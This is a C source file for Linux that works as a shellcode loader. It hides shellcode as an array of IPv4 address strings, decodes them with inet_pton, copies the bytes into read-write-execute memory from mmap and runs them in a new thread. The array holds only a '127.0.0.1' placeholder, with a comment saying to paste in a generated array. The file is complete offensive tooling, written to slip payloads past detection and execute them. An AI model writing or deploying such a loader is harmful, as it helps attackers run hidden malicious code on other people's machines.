#define _DEFAULT_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

#ifndef MAP_ANONYMOUS
#define MAP_ANONYMOUS MAP_ANON
#endif

/*
 * Replace this placeholder with the generated IPv4 array.
 */
static const char* IPv4Shell[] = {
    "127.0.0.1"
};

#define IPV4_BINARY_SIZE 4
#define ELEMENTS_COUNT ((int)(sizeof(IPv4Shell) / sizeof(IPv4Shell[0])))
#define SHELLCODE_SIZE ((size_t)(ELEMENTS_COUNT * IPV4_BINARY_SIZE))

typedef struct {
    unsigned char* buffer;
    size_t size;
} ShellcodeInfo;

/**
 @param ipv4_strings 
 @param output_buffer 
 @param element_count 
 @return
 */

int decode_ipv4_fuscation(const char* ipv4_strings[], unsigned char* output_buffer, int element_count) {
    struct in_addr addr;
    int offset = 0;
    
    for (int i = 0; i < element_count; i++) {
        // Convert IPv4 string to binary
        if (inet_pton(AF_INET, ipv4_strings[i], &addr) != 1) {
            fprintf(stderr, "[!] Failed to convert IPv4 string: %s\n", ipv4_strings[i]);
            return -1;
        }
        
        memcpy(output_buffer + offset, &addr, 4);
        offset += 4;
    }
    
    return 0;
}

/**
 * @param size 
 * @return 
 */
void* allocate_executable_memory(size_t size) {
    void* buffer = mmap(NULL, size, 
                        PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_PRIVATE | MAP_ANONYMOUS, 
                        -1, 0);
    
    if (buffer == MAP_FAILED) {
        perror("[!] mmap failed");
        return NULL;
    }
    
    return buffer;
}


void* execute_shellcode(void* arg) {
    void (*shellcode)() = (void(*)())arg;
    shellcode();
    return NULL;
}


void free_executable_memory(void* buffer, size_t size) {
    if (buffer != NULL) {
        munmap(buffer, size);
    }
}

void print_memory_info(const ShellcodeInfo* info, void* exec_buffer) {
    printf("[i] Shellcode size: %zu bytes\n", info->size);
    printf("[i] Elements count: %d\n", ELEMENTS_COUNT);
    printf("[+] Executable buffer address: %p\n", exec_buffer);
}

int main() {
    ShellcodeInfo shellcode = {
        .buffer = NULL,
        .size = SHELLCODE_SIZE
    };
    
    void* exec_buffer = NULL;
    pthread_t thread_id;
    int result = 0;
    
    printf("[*] IPv4 Shellcode Decoder for Linux\n");
    printf("[*] =================================\n");
    
    shellcode.buffer = (unsigned char*)malloc(shellcode.size);
    if (!shellcode.buffer) {
        perror("[!] Failed to allocate temporary buffer");
        return -1;
    }
    
    printf("[*] Decoding IPv4 shellcode...\n");
    if (decode_ipv4_fuscation(IPv4Shell, shellcode.buffer, ELEMENTS_COUNT) != 0) {
        fprintf(stderr, "[!] Failed to decode shellcode\n");
        result = -1;
        goto cleanup;
    }
    printf("[+] Shellcode decoded successfully\n");
    
    printf("[*] Allocating executable memory...\n");
    exec_buffer = allocate_executable_memory(shellcode.size);
    if (!exec_buffer) {
        result = -1;
        goto cleanup;
    }
    
    memcpy(exec_buffer, shellcode.buffer, shellcode.size);
    
    print_memory_info(&shellcode, exec_buffer);
    
    printf("[*] Creating execution thread...\n");
    if (pthread_create(&thread_id, NULL, execute_shellcode, exec_buffer) != 0) {
        perror("[!] Failed to create thread");
        result = -1;
        goto cleanup;
    }
    
    printf("[+] Shellcode executed in thread\n");
    printf("[+] Press Enter to exit...\n");
    getchar();
    
    pthread_join(thread_id, NULL);
    
cleanup:
    if (shellcode.buffer) {
        free(shellcode.buffer);
    }
    
    if (exec_buffer) {
        free_executable_memory(exec_buffer, shellcode.size);
    }
    
    printf("[*] Cleanup complete\n");
    return result;
}
